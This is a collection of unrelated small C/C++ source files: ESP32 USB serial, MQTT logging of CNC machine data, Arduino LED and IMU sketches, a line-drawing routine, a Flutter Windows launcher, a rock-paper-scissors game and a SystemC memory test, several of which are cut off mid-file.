    "/*!\n    \\file\n    \\brief \u041a\u043b\u0430\u0441\u0441 \u043e\u0431\u0435\u0440\u0442\u043a\u0430 \u0434\u043b\u044f tinyUSB \u0421D\u0421.\n    \\authors \u0411\u043b\u0438\u0437\u043d\u0435\u0446 \u0420.\u0410. (r.bliznets@gmail.com)\n    \\version 0.1.0.0\n    \\date 16.04.2024\n\n    \u041e\u0434\u0438\u043d \u043e\u0431\u044a\u0435\u043a\u0442 \u043d\u0430 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0435.\n*/\n\n#include \"sdkconfig.h\"\n#ifdef CONFIG_TINYUSB_CDC_ENABLED\n\n#include \"CUsbCDC.h\"\n#include \"esp_log.h\"\n#include \"CTrace.h\"\n#include <cstring>\n\n#include \"esp_sleep.h\"\n\nint8_t CUsbCDC::mWakeUpPin = -1;\n\nCUsbCDC *CUsbCDC::theSingleInstance = nullptr;\n\nvoid CUsbCDC::cdc_rx_callback(int itf, cdcacm_event_t *event)\n{\n    CUsbCDC::Instance()->rx((tinyusb_cdcacm_itf_t)itf);\n}\n\nvoid CUsbCDC::rx(tinyusb_cdcacm_itf_t itf)\n{\n    size_t rx_size = 0;\n    esp_err_t ret;\n\n    for (;;)\n    {\n        ret = tinyusb_cdcacm_read(itf, mRxBuf0, USB_MAX_DATA, &rx_size);\n        if (ret != ESP_OK)\n        {\n            TRACE_E(\"CUsbCDC tinyusb_cdcacm_read failed\", ret, false);\n            return;\n        }\n        if (rx_size != 0)\n        {\n            if (onCmd != nullptr)\n                onCmd(itf, mRxBuf0, rx_size);\n            else\n                TRACEDATA(\"cdc rx\", mRxBuf0, rx_size);\n        }\n        if (rx_size < USB_MAX_DATA)\n            return;\n    }\n}\n\nvoid CUsbCDC::cdc_line_state_changed_callback(int itf, cdcacm_event_t *event)\n{\n    int dtr = event->line_state_changed_data.dtr;\n    if (CUsbCDC::Instance()->onConnect != nullptr)\n        CUsbCDC::Instance()->onConnect(itf, (dtr == 1));\n}\n\nvoid CUsbCDC::start(onCDCDataRx *func, onCDCConect *connect)\n{\n    const tinyusb_config_t tusb_cfg = {\n        .device_descriptor = nullptr,\n        .string_descriptor = nullptr,\n        .string_descriptor_count = 0,\n        .external_phy = false,\n        .configuration_descriptor = nullptr,\n        .self_powered = true,\n        .vbus_monitor_io = mWakeUpPin};\n\n    ESP_ERROR_CHECK(tinyusb_driver_install(&tusb_cfg));\n\n    tinyusb_config_cdcacm_t acm_cfg = {\n        .usb_dev = TINYUSB_USBDEV_0,\n        .cdc_port = TINYUSB_CDC_ACM_0,\n        .rx_unread_buf_sz = USB_MAX_DATA,\n        .callback_rx = &cdc_rx_callback,\n        .callback_rx_wanted_char = nullptr,\n        .callback_line_state_changed = &cdc_line_state_changed_callback,\n        .callback_line_coding_changed = nullptr};\n\n    ESP_ERROR_CHECK(tusb_cdc_acm_init(&acm_cfg));\n\n#if (CONFIG_TINYUSB_CDC_COUNT > 1)\n    acm_cfg.cdc_port = TINYUSB_CDC_ACM_1;\n    ESP_ERROR_CHECK(tusb_cdc_acm_init(&acm_cfg));\n#endif\n\n    onCmd = func;\n    onConnect = connect;\n}\n\nvoid CUsbCDC::stop()\n{\n    TRACE_W(\"CUsbCDC off until reboot\", -100, false);\n#if (CONFIG_TINYUSB_CDC_COUNT > 1)\n    ESP_ERROR_CHECK(tusb_cdc_acm_deinit(TINYUSB_CDC_ACM_1));\n#endif\n    ESP_ERROR_CHECK(tusb_cdc_acm_deinit(TINYUSB_CDC_ACM_0));\n    ESP_ERROR_CHECK(tinyusb_driver_uninstall());\n}\n\nbool CUsbCDC::send(int itf, uint8_t *data, size_t size)\n{\n    size_t sz = tinyusb_cdcacm_write_queue((tinyusb_cdcacm_itf_t)itf, data, size);\n    if (sz == 0)\n        return false;\n    while (sz != size)\n    {\n        sz += tinyusb_cdcacm_write_queue((tinyusb_cdcacm_itf_t)itf, &data[sz], size - sz);\n    }\n    ESP_ERROR_CHECK(tinyusb_cdcacm_write_flush((tinyusb_cdcacm_itf_t)itf, 100));\n    return true;\n}\n\n#endif // CONFIG_TINYUSB_CDC_ENABLED\n",
    "#include <iostream>\n#include <thread>\n#include <string>\n#include <vector>\n#include <queue>\n#include <fstream>\n#include <sys/stat.h>  // \u7528\u4e8e\u68c0\u67e5\u548c\u521b\u5efa\u76ee\u5f55\n#include <direct.h>    // \u5728 Windows \u4e0a\u4f7f\u7528 _mkdir\n#include <nlohmann/json.hpp>\n#include <iomanip>\n#include <sstream>\n#include <ctime>\n#include <locale>\n#include \"MQTTClient.h\"\nusing namespace std;\n\nusing json = nlohmann::json;\n\n// \u5b9a\u4e49MQTT\u53c2\u6570\n#define ADDRESS     \"tcp://localhost:1883\"  // MQTT \u670d\u52a1\u5668\u5730\u5740\n#define CLIENTID    \"ExampleClientSub\"       // \u5ba2\u6237\u7aef ID\n#define QOS         1                        // \u670d\u52a1\u8d28\u91cf\u7b49\u7ea7\n#define TIMEOUT     10000L                   // \u8d85\u65f6\u65f6\u95f4\n\nqueue<string> Messages;\nqueue<string> Focas;\nqueue<string> FocasNC;\nqueue<string> FocasPower;\nqueue<string> VibrationMain;\nqueue<string> VibrationFeed;\nqueue<string> Macro;\nqueue<string> PLC;\n\nstring ParseFocas(const string& msg, const string& type);\nvector<string> ParseVibration(const string& msg, const string& type);\nvoid SaveMessages();\nvoid delivered(void* context, MQTTClient_deliveryToken dt);\nint msgarrvd(void* context, char* topicName, int topicLen, MQTTClient_message* message);\nvoid connlost(void* context, char* cause);\nbool DirectoryExists(const string& dirPath);\nbool CreateDirectory(const string& dirPath);\n\nvolatile MQTTClient_deliveryToken deliveredtoken;\n\nvoid delivered(void* context, MQTTClient_deliveryToken dt) {\n    cout << \"Message with token value \" << dt << \" delivery confirmed\" << endl;\n    deliveredtoken = dt;\n}\n\n// \u5f53\u8fde\u63a5\u4e22\u5931\u65f6\u8c03\u7528\nvoid connlost(void* context, char* cause) {\n    cout << \"\\nConnection lost\" << endl;\n    cout << \"Cause: \" << cause << endl;\n}\n\n\nbool DirectoryExists(const string& dirPath) {\n    struct stat info;\n    if (stat(dirPath.c_str(), &info) != 0) {\n        return false;  // \u8def\u5f84\u4e0d\u5b58\u5728\n    }\n    else if (info.st_mode & S_IFDIR) {\n        return true;   // \u8def\u5f84\u5b58\u5728\u4e14\u4e3a\u76ee\u5f55\n    }\n    else {\n        return false;  // \u8def\u5f84\u5b58\u5728\u4f46\u4e0d\u662f\u76ee\u5f55\n    }\n}\n\nbool CreateDirectory(const string& dirPath) {\n    return _mkdir(dirPath.c_str()) == 0 || errno == EEXIST;  // Windows \u4f7f\u7528 _mkdir\n}\n\nvoid SaveMessages()\n{\n    string focas = \"\";\n    string focasNC = \"\";\n    string focasPower = \"\";\n    string vibrationMain = \"\";\n    string vibrationFeed = \"\";\n    string macro = \"\";\n    string plc = \"\";\n\n    // \u5b9a\u4e49\u684c\u9762\u8def\u5f84\n    string desktopPath = \"C:\";  // \u56fa\u5b9a\u8def\u5f84\n    string topic = \"TW_part\"; // \u66ff\u6362\u6210\u5b9e\u9645\u7684\u4e3b\u9898\n    if (!topic.empty()) {\n        desktopPath = desktopPath + \"//\" + topic;  // \u5408\u6210\u8def\u5f84\n        if (!DirectoryExists(desktopPath)) {\n            if (!CreateDirectory(desktopPath)) {\n                cerr << \"\u65e0\u6cd5\u521b\u5efa\u76ee\u5f55: \" << desktopPath << endl;\n                return ;  // \u521b\u5efa\u76ee\u5f55\u5931\u8d25\uff0c\u9000\u51fa\u7a0b\u5e8f\n            }\n        }\n    }\n\n    // \u6587\u4ef6\u8def\u5f84\n    string FocasPath = desktopPath + \"//Focas.txt\";\n    string FocasNCPath = desktopPath + \"//FocasNC.txt\";\n    string FocasPowerPath = desktopPath + \"//FocasPower.txt\";\n    string VibrationMainPath = desktopPath + \"//VibrationMain.txt\";\n    string VibrationFeedPath = desktopPath + \"//VibrationFeed.txt\";\n    string MacroPath = desktopPath + \"//FocasMacro.txt\";\n    string PLCPath = desktopPath + \"//FocasPLC.txt\";\n\n    // \u5199\u5165\u6587\u4ef6\u5185\u5bb9\n    ofstream focasFile(FocasPath, ios::app);\n    if (focasFile.is_open()) {\n        focasFile << \"\u65f6\u95f4 \u4e3b\u8f74\u8d1f\u8f7d X\u8f74\u8d1f\u8f7d Y\u8f74\u8d1f\u8f7d Z\u8f74\u8d1f\u8f7d \u4e3b\u8f74\u8f6c\u901f \u8fdb\u7ed9\u901f\u5ea6 X\u673a\u68b0\u5750\u6807 Y\u673a\u68b0\u5750\u6807 Z\u673a\u68b0\u5750\u6807\\n\";\n        focasFile.close();\n    }\n\n    ofstream focasNCFile(FocasNCPath, ios::app);\n    if (focasNCFile.is_open()) {\n        focasNCFile << \"\u65f6\u95f4 \u7a0b\u5e8f\u53f7 \u5b50\u7a0b\u5e8f\u53f7 \u6307\u4ee4\u884c\u53f7 GCode\\n\";\n        focasNCFile.close();\n    }\n\n    ofstream focasPowerFile(FocasPowerPath, ios::app);\n    if (focasPowerFile.is_open()) {\n        focasPowerFile << \"\u65f6\u95f4 \u4e3b\u8f74\u529f\u7387\\n\";\n        focasPowerFile.close();\n    }\n\n    ofstream vibrationMainFile(VibrationMainPath, ios::app);\n    if (vibrationMainFile.is_open()) {\n        vibrationMainFile << \"\u65f6\u95f4 \u4e3b\u8f74\u632f\u52a8\u4fe1\u53f7X \u4e3b\u8f74\u632f\u52a8\u4fe1\u53f7Y \u4e3b\u8f74\u632f\u52a8\u4fe1\u53f7Z\\n\";\n        vibrationMainFile.close();\n    }\n\n    ofstream vibrationFeedFile(VibrationFeedPath, ios::app);\n    if (vibrationFeedFile.is_open()) {\n        vibrationFeedFile << \"\u65f6\u95f4 \u8fdb\u7ed9\u8f74\u632f\u52a8\u4fe1\u53f7X \u8fdb\u7ed9\u8f74\u632f\u52a8\u4fe1\u53f7Y \u8fdb\u7ed9\u8f74\u632f\u52a8\u4fe1\u53f7Z\\n\";\n        vibrationFeedFile.close();\n    }\n\n    ofstream macroFile(MacroPath, ios::app);\n    if (macroFile.is_open()) {\n        macroFile << \"\u65f6\u95f4 \u53d8\u91cf1 \u53d8\u91cf2 #00510\\n\";\n        macroFile.close();\n    }\n\n    ofstream plcFile(PLCPath, ios::app);\n    if (plcFile.is_open()) {\n        plcFile << \"\u65f6\u95f4 \u5faa\u73af\u542f\u52a8 \u5200\u5177\u53f7 \u5207\u524a\u4fe1\u53f7 \u8fdb\u7ed9\u65cb\u94ae M180 M182\\n\";\n        plcFile.close();\n    }\n\n    while (true) {\n        // \u5904\u7406 Focas \u961f\u5217\n        if (!Focas.empty()) {\n            focas = Focas.front();\n            Focas.pop();\n            ofstream outFile(FocasPath, ios_base::app);\n            outFile << ParseFocas(focas, \"Focas\") << \"\\n\";\n        }\n\n        // \u5904\u7406 FocasNC \u961f\u5217\n        if (!FocasNC.empty()) {\n            focasNC = FocasNC.front();\n            FocasNC.pop();\n            ofstream outFile(FocasNCPath, ios_base::app);\n            outFile << ParseFocas(focasNC, \"FocasNC\") << \"\\n\";\n        }\n\n        // \u5904\u7406 FocasPower \u961f\u5217\n        if (!FocasPower.empty()) {\n            focasPower = FocasPower.front();\n            FocasPower.pop();\n            ofstream outFile(FocasPowerP",
    "#include <Wire.h>\n#include \"RTClib.h\"\n\nRTC_DS1307 rtc;\n\n// Define LED pins\nconst int led1 = 2;  // LED 1 to Pin 2\nconst int led2 = 3;  // LED 2 to Pin 3\nconst int led3 = 4;  // LED 3 to Pin 4\nconst int led4 = 5;  // LED 4 to Pin 5\n\n// Define time slots for LEDs\nconst int led1_start_hour = 0;   // LED 1 starts at 00:00 AM\nconst int led1_end_hour = 6;     // LED 1 ends at 6:00 AM\n\nconst int led2_start_hour = 6;   // LED 2 starts at 6:00 AM\nconst int led2_end_hour = 12;    // LED 2 ends at 12:00 PM\n\nconst int led3_start_hour = 12;  // LED 3 starts at 12:00 PM\nconst int led3_end_hour = 18;    // LED 3 ends at 6:00 PM\n\nconst int led4_start_hour = 18;  // LED 4 starts at 6:00 PM\nconst int led4_end_hour = 24;    // LED 4 ends at 12:00 AM\n\nvoid setup() {\n  // Initialize the LED pins as OUTPUT\n  pinMode(led1, OUTPUT);\n  pinMode(led2, OUTPUT);\n  pinMode(led3, OUTPUT);\n  pinMode(led4, OUTPUT);\n\n  // Turn off all LEDs initially\n  digitalWrite(led1, LOW);\n  digitalWrite(led2, LOW);\n  digitalWrite(led3, LOW);\n  digitalWrite(led4, LOW);\n\n  // Initialize Serial Monitor\n  Serial.begin(9600);\n\n  // Initialize RTC\n  Wire.begin();\n  if (!rtc.begin()) {\n    Serial.println(\"Couldn't find RTC\");\n    while (1);  // Stop if RTC not found\n  }\n\n  // Uncomment and set the RTC to the current time if needed (for testing)\n // rtc.adjust(DateTime(2024, 9, 14, 14, 10, 30));  // Adjust time if needed\n}\n\nvoid loop() {\n  DateTime now = rtc.now();  // Get the current time from the RTC\n\n  // Print current time to the Serial Monitor\n  Serial.print(now.hour());\n  Serial.print(\":\");\n  Serial.print(now.minute());\n  Serial.print(\":\");\n  Serial.println(now.second());\n\n  // Get the current hour\n  int currentHour = now.hour();\n\n  // Determine which LED should be on based on the current hour\n  if (currentHour >= led1_start_hour && currentHour < led1_end_hour) {\n    // Between 00:00 AM and 6:00 AM - Turn on LED 1\n    digitalWrite(led1, HIGH);\n    digitalWrite(led2, LOW);\n    digitalWrite(led3, LOW);\n    digitalWrite(led4, LOW);\n    Serial.println(\"LED 1 ON\");\n  } else if (currentHour >= led2_start_hour && currentHour < led2_end_hour) {\n    // Between 6:00 AM and 12:00 PM - Turn on LED 2\n    digitalWrite(led1, LOW);\n    digitalWrite(led2, HIGH);\n    digitalWrite(led3, LOW);\n    digitalWrite(led4, LOW);\n    Serial.println(\"LED 2 ON\");\n  } else if (currentHour >= led3_start_hour && currentHour < led3_end_hour) {\n    // Between 12:00 PM and 6:00 PM - Turn on LED 3\n    digitalWrite(led1, LOW);\n    digitalWrite(led2, LOW);\n    digitalWrite(led3, HIGH);\n    digitalWrite(led4, LOW);\n    Serial.println(\"LED 3 ON\");\n  } else if (currentHour >= led4_start_hour && currentHour < led4_end_hour) {\n    // Between 6:00 PM and 00:00 AM - Turn on LED 4\n    digitalWrite(led1, LOW);\n    digitalWrite(led2, LOW);\n    digitalWrite(led3, LOW);\n    digitalWrite(led4, HIGH);\n    Serial.println(\"LED 4 ON\");\n  } else {\n    // Turn off all LEDs if no condition is met\n    digitalWrite(led1, LOW);\n    digitalWrite(led2, LOW);\n    digitalWrite(led3, LOW);\n    digitalWrite(led4, LOW);\n    Serial.println(\"All LEDs OFF\");\n  }\n\n  // Check every second\n  delay(1000);\n}\n",
    "#include <Arduino.h>\n#include <Adafruit_BNO08x.h> //has the library\n#include <HX711.h>\n#include <SdFat.h>\n#include <Adafruit_NeoPixel.h>\n\n//LED Setup\n#ifdef __AVR__\n #include <avr/power.h> // Required for 16 MHz Adafruit Trinket\n#endif\n#define PIN 23 // On Trinket or Gemma, suggest changing this to 1\n#define NUMPIXELS 1 \nAdafruit_NeoPixel pixels(NUMPIXELS, PIN, NEO_GRB + NEO_KHZ800);\n#define DELAYVAL 500 // Time (in milliseconds) to pause between pixels\n\n//Creating instance of the BNO08x IMU sensor\nAdafruit_NeoPixel pixels(NUMPIXELS, PIN, NEO_GRB + NEO_KHZ800);\nAdafruit_BNO08x bno08x;\n\n//variables for storing IMU data\nsh2_SensorValue_t sensorValue;\nfloat acceleration[4];\nfloat angular_velocity[4];\nfloat linear_acceleration[4];\nfloat gravity[4];\nfloat magnet[4];\nfloat orientation[5];\n\nvoid setup() {\n    //initialize serial communication for debugging\n    Serial.begin(115200);\n\n    pixels.begin(); //initialize the neopixel strip\n\n    //IMU initialization\n    Serial.println(\"Initializing IMU...\");\n    if(!bno08x.begin_I2C()){\n        while(!bno08x.begin_I2C()){\n            Serial.println(\"IMU not found\");\n            pixels.setPixelColor(0,pixels.Color(160, 32, 255)); \n            pixels.show(); // Purple\n            delay(1000);  //one sec wait (og was 100)\n        }\n    }\n\n    Serial.println(\"IMU initialized successfully!\");\n\n}\n\nvoid loop() {\n    //Read IMU\n    bno08x.getSensorEvent(&sensorValue);\n    switch (sensorValue.sensorId) {\n        case SH2_ACCELEROMETER:\n        acceleration[0] = sensorValue.un.accelerometer.x;\n        acceleration[1] = sensorValue.un.accelerometer.y;\n        acceleration[2] = sensorValue.un.accelerometer.z;\n        acceleration[3] = sensorValue.timestamp;\n        break;\n      \n        case SH2_GYROSCOPE_CALIBRATED:\n        angular_velocity[0] = sensorValue.un.gyroscope.x;\n        angular_velocity[1] = sensorValue.un.gyroscope.y;\n        angular_velocity[2] = sensorValue.un.gyroscope.z;\n        angular_velocity[3] = sensorValue.timestamp;\n        break;\n        \n        case SH2_LINEAR_ACCELERATION:\n        linear_acceleration[0] = sensorValue.un.linearAcceleration.x;\n        linear_acceleration[1] = sensorValue.un.linearAcceleration.y;\n        linear_acceleration[2] = sensorValue.un.linearAcceleration.z;\n        linear_acceleration[3] = sensorValue.timestamp;\n        break;\n        \n        case SH2_GRAVITY:\n        gravity[0] = sensorValue.un.gravity.x;\n        gravity[1] = sensorValue.un.gravity.y;\n        gravity[2] = sensorValue.un.gravity.z;\n        gravity[3] = sensorValue.timestamp;\n        break;\n        \n        case SH2_MAGNETIC_FIELD_CALIBRATED:\n        magnet[0] = sensorValue.un.magneticField.x;\n        magnet[1] = sensorValue.un.magneticField.y;\n        magnet[2] = sensorValue.un.magneticField.z;\n        magnet[3] = sensorValue.timestamp;\n        break;\n\n        case SH2_ROTATION_VECTOR:\n        orientation[0] = sensorValue.un.rotationVector.i;\n        orientation[1] = sensorValue.un.rotationVector.j;\n        orientation[2] = sensorValue.un.rotationVector.k;\n        orientation[3] = sensorValue.un.rotationVector.real;\n        orientation[4] = sensorValue.timestamp;\n        break;\n    }\n\n  // Optional: Print the IMU data for debugging\n  Serial.print(\"Acceleration: \");\n  Serial.print(acceleration[0]); Serial.print(\", \");\n  Serial.print(acceleration[1]); Serial.print(\", \");\n  Serial.print(acceleration[2]); Serial.println(\" m/s^2\");\n\n  // Add a delay to slow down the loop (if needed)\n  delay(100); \n\n\n}\n\n",
    "#include \"definitions.h\"\n#include <iostream>\n#include <cmath>\n#include <stdio.h>\n\nusing namespace std;\n\n//-----------------------------------------------------------------------------\nvoid MyGlDraw(void)\n{\n    //*************************************************************************\n    // Chame aqui as fun\u00e7\u00f5es do mygl.h\n    //*************************************************************************\n    \n    int width = IMAGE_WIDTH;\n    int height = IMAGE_HEIGHT;\n    \n    DrawLine(0, height / 2, width, height / 2, 255, 0, 0, 255); // Vermelho\n    \n    DrawLine(width / 2, 0, width / 2, height, 0, 255, 0, 255); // Verde\n    \n    DrawLine(0, 0, width, height, 0, 0, 255, 255); // Azul\n    \n    DrawLine(width, 0, 0, height, 255, 255, 0, 255); // Amarelo\n\n    DrawLine(0, height, width, 0, 255, 0, 255, 255); // Magenta\n\n    DrawLine(width, height, 0, 0, 0, 255, 255, 255); // Ciano\n\n    DrawLine(0, height / 4, width, (3 * height) / 4, 255, 128, 0, 255); // Laranja\n\n    DrawLine(width, height / 4, 0, (3 * height) / 4, 128, 0, 255, 255); // Roxo\n\n    DrawLine((3 * width) / 4, 0, width / 4, height, 0, 255, 128, 255); // Verde-claro\n\n    DrawLine(width / 4, 0, (3 * width) / 4, height, 255, 0, 255, 255); // Rosa\n\n    // (x0, y0), (x1, y1), (x2, y2), r, g, b, a\n    DrawTriangle(100, 100, 200, 150, 150, 250, 255, 0, 0, 255); \n\n    // (x0, y0), (x1, y1), (x2, y2), r, g, b, a\n    DrawTriangle(300, 300, 400, 350, 350, 450, 0, 255, 0, 255);  \n\n    // (x0, y0), (x1, y1), (x2, y2), r, g, b, a\n    DrawTriangle(50, 400, 120, 450, 80, 500, 0, 0, 255, 255);    \n\n    // (x0, y0), (x1, y1), (x2, y2), r, g, b, a\n    DrawTriangle(200, 50, 250, 100, 150, 120, 255, 255, 0, 255);\n}\n\n\nvoid PutPixel(int x, int y, unsigned char r, unsigned char g, unsigned char b, unsigned char a) {\n    int index = (x + y * IMAGE_WIDTH) * 4;\n    FBptr[index] = r;   // Componente vermelha\n    FBptr[index + 1] = g; // Componente verde\n    FBptr[index + 2] = b; // Componente azul\n    FBptr[index + 3] = a; // Componente alpha\n}\n\nvoid DrawLine(int x0, int y0, int x1, int y1, unsigned char r, unsigned char g, unsigned char b, unsigned char a) {\n\n    // Algoritmo de Bresenham\n    int dx = abs(x1 - x0), sx = x0 < x1 ? 1 : -1;\n    int dy = abs(y1 - y0), sy = y0 < y1 ? 1 : -1;\n    int err = dx - dy;\n\n    while (true) {\n        // Desenha o pixel na posi\u00e7\u00e3o atual\n        PutPixel(x0, y0, r, g, b, a);\n\n        if (x0 == x1 && y0 == y1) break;\n\n        int e2 = 2 * err;\n        if (e2 > -dy) {\n            err -= dy;\n            x0 += sx;\n        }\n        if (e2 < dx) {\n            err += dx;\n            y0 += sy;\n        }\n    }\n}\n\nvoid DrawTriangle(int x0, int y0, int x1, int y1, int x2, int y2, unsigned char r, unsigned char g, unsigned char b, unsigned char a) {\n    \n    // Desenha 3 linhas que se interligam\n    DrawLine(x0, y0, x1, y1, r, g, b, a); // Linha do ponto (x0, y0) para (x1, y1)\n    DrawLine(x1, y1, x2, y2, r, g, b, a); // Linha do ponto (x1, y1) para (x2, y2)\n    DrawLine(x2, y2, x0, y0, r, g, b, a); // Linha do ponto (x2, y2) para (x0, y0)\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"week6\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "# include <stdio.h>\n# include <conio.h>\n# include <stdlib.h>\n# include <string.h>\n\n\ntypedef struct {\nint ganados;\nint perdidos;\nint empatados;\n} Estadistica;\n\n\n\n int random_number(int min_num, int max_num)\n    {\n        int result = 0, low_num = 0, hi_num = 0;\n\n        if (min_num < max_num)\n        {\n            low_num = min_num;\n            hi_num = max_num + 1; // include max_num in output\n        } else {\n            low_num = max_num + 1; // include max_num in output\n            hi_num = min_num;\n        }\n\n      \n        result = (rand() % (hi_num - low_num)) + low_num;\n        return result;\n    }\n\n\nint main (void)\n{\nint jug, maq, op, r, rondas;\nchar nombre1[20];\nchar nombre2[20];\nchar jugada[20];\nchar jugada2[20];\nint contador =0;\nEstadistica resultados[2];\nchar op3;\n\ndo\n{\n\n\nprintf(\"Hola, jugaremos pidra, papel o tijera\\n\");\n\nprintf(\"Introduzca nombre jugador 1 : \");\nscanf(\"%s\", nombre1);\n\nresultados[0].perdidos = 0;\nresultados[0].ganados = 0;\nresultados[0].empatados = 0;\n\n\nprintf(\"Introduzca nombre jugador 2 : \");\nscanf(\"%s\", nombre2);\nresultados[1].perdidos = 0;\nresultados[1].ganados = 0;\nresultados[1].empatados = 0;\n\n\nprintf(\"Introduzca numero de rondas a jugar  : \");\nscanf(\"%d\", &rondas);\n\n\n\n\ndo{\n\ncontador ++;\n\nprintf(\"Ronda del Juego # %d \\n\", contador);\n\nprintf(\"Introduzca seleccion jugador 1(%s) = \", nombre1);\nscanf(\"%s\", jugada);\n\nif (strcmp(strlwr(jugada), \"piedra\") ==0) { jug = 0;}\nelse if (strcmp(strlwr(jugada), \"papel\") ==0) { jug = 1;}\nelse if (strcmp(strlwr(jugada), \"tijeras\") ==0) { jug = 2;}\n\n\nprintf(\"Introduzca seleccion jugador 2(%s) =  \", nombre2);\nscanf(\"%s\", jugada2);\n\nif (strcmp(strlwr(jugada2), \"piedra\") ==0) { r = 0;}\nelse if (strcmp(strlwr(jugada2), \"papel\") ==0) { r = 1;}\nelse if (strcmp(strlwr(jugada2), \"tijeras\") ==0) { r = 2;}\n\n\n\nswitch (jug)\n{\ncase 0:\nprintf(\"%s  eligio Piedra\\n\", nombre1);\n    if (r==0)\n    {\n     \tprintf(\"\\t %s eligio Piedra\\n\\n\", nombre2);\n        printf(\"\\t\\t\\tEmpate en la ronda \\n\\n\\n\");\n        \n        resultados[0].empatados += 1;\n        resultados[1].empatados += 1;\n\n    }\n else\n    {\n     if (r==1)\n     {\n       \tprintf(\"\\t %s eligio Papel\\n\\n\", nombre2);\n        printf(\"\\t\\t\\t %s Gana la ronda \\n\\n\\n\", nombre2);\n        \n        resultados[1].ganados += 1;\n        resultados[0].perdidos += 1;\n\n     }\n     else\n    {\n     if (r==2)\n     {\n     \tprintf(\"\\t %s eligio Tijeras \\n\\n\", nombre2);\n        printf(\"\\t\\t\\t %s Gana la ronda \\n\\n\\n\", nombre1);\n            resultados[0].ganados += 1;\n        resultados[1].perdidos += 1;\n\t\n\t }\n\n    }\n  }\nbreak;\ncase 1:\nprintf(\"%s  eligio Papel \\n\", nombre1);\t\n        if (r==0)\n        {\n\n     \tprintf(\"\\t %s eligio Piedra \\n\\n\", nombre2);\n        printf(\"\\t\\t\\t %s Gana la ronda \\n\\n\\n\", nombre1);\n\n        resultados[0].ganados += 1;\n        resultados[1].perdidos += 1;\n\n        }\n        else\n        {\n            if (r==1)\n            {\n\n         \tprintf(\"\\t %s eligio Papel\\n\\n\", nombre2);\n            printf(\"\\t\\t\\tEmpate en la ronda \\n\\n\\n\");\n        resultados[0].empatados += 1;\n        resultados[1].empatados += 1;\n\n            }\n            else\n            {\n                if (r==2)\n                {\n\n     \tprintf(\"\\t %s eligio Tijeras \\n\\n\", nombre2);\n        printf(\"\\t\\t\\t %s Gana la ronda \\n\\n\\n\", nombre2);\n        resultados[1].ganados += 1;\n        resultados[0].perdidos += 1;\n\n                }\n            }\n        }\nbreak;\ncase 2 :\nprintf(\"%s  eligio Tijeras \\n\", nombre1);\t\n\t\n          if (r==0)\n          {\n     \tprintf(\"\\t %s eligio Piedra \\n\\n\", nombre2);\n        printf(\"\\t\\t\\t %s Gana la ronda \\n\\n\\n\", nombre2);\n                resultados[1].ganados += 1;\n                resultados[0].perdidos += 1;\n          }\n          else\n          {\n              if (r==1)\n              {\n       \tprintf(\"\\t %s eligio Papel \\n\\n\", nombre2);\n        printf(\"\\t\\t\\t %s Gana la ronda \\n\\n\\n\", nombre1);\n                resultados[0].ganados += 1;\n        resultados[1].perdidos += 1;\n              }\n              else\n              {\n                  if (r==2)\n                  {\n       \tprintf(\"\\t %s eligio Tijeras\\n\\n\", nombre2);\n            printf(\"\\t\\t\\tEmpate en la ronda \\n\\n\\n\");\n\n        resultados[0].empatados += 1;\n        resultados[1].empatados += 1;\n\n                  }\n              }\n          }\n          break;\ndefault:\n    printf(\"Por favor solo introduce los numeros que aparecen en el menu\");\n}\n\nif (contador < rondas ) {\nprintf(\"Quieres jugar la siguiente ronda?\\n\");\nprintf(\"Si deseas continuar  jugando presiona 1\\n\");\nprintf(\"Si deseas salir del juego presiona 2\\n\");\nscanf(\"%d\", &op);\nsystem(\"cls\");\n\n\n}\n\n\n\n\nif (contador == rondas ) break;\n\n\n}\nwhile( (op != 2));\n\n\nprintf(\"Resultados \\n\");\nprintf(\"jugador %s - ganados = %d  - perdidos =  %d  - empatados = %d\\n\", nombre1, resultados[0].ganados, resultados[0].perdidos, resultados[0].empatados); \nprintf(\"jugador %s - ganados = %d  - perdidos =  %d  - empatados = %d\\n\", nombre2, resultados[1].ganados, resultados[1].perdidos, resultados[1].empata",
    "#include \"memWriteRead.h\"\r\n\r\nvoid memWriterReader::memWritingReading(){\t\t\r\n\tsc_time blockedTime = sc_time(13, SC_NS);\r\n\tsc_time pauseTime = sc_time(15, SC_NS);\r\n\r\n\tfor (int i = 0; i < 111; i += 11) {\r\n\t\ttlm::tlm_command cmd = (tlm::tlm_command)(rand() % 2);\r\n\t\tif (cmd == tlm::TLM_WRITE_COMMAND) {\r\n\t\t\tdata[0] = (sc_lv<8>) (i+5);\r\n\t\t\tdata[1] = (sc_lv<8>) (i+6);\r\n\t\t\tdata[2] = (sc_lv<8>) (i+7);\r\n\t\t\tdata[3] = (sc_lv<8>) (i+8);\r\n\t\t\tdata[4] = (sc_lv<8>) (i+9);\r\n\t\t}\r\n\t\t\r\n\t\tblockWriteRead->set_command( cmd );\r\n\t\tblockWriteRead->set_address( i );\r\n\t\tblockWriteRead->set_data_ptr( (unsigned char*) data );\r\n\t\tblockWriteRead->set_data_length( 5 );     \r\n\t\tblockWriteRead->set_streaming_width( 5 ); \r\n\t\tblockWriteRead->set_byte_enable_ptr( 0 ); \r\n\t\tblockWriteRead->set_dmi_allowed( false ); \r\n\t\tblockWriteRead->set_response_status( tlm::TLM_INCOMPLETE_RESPONSE 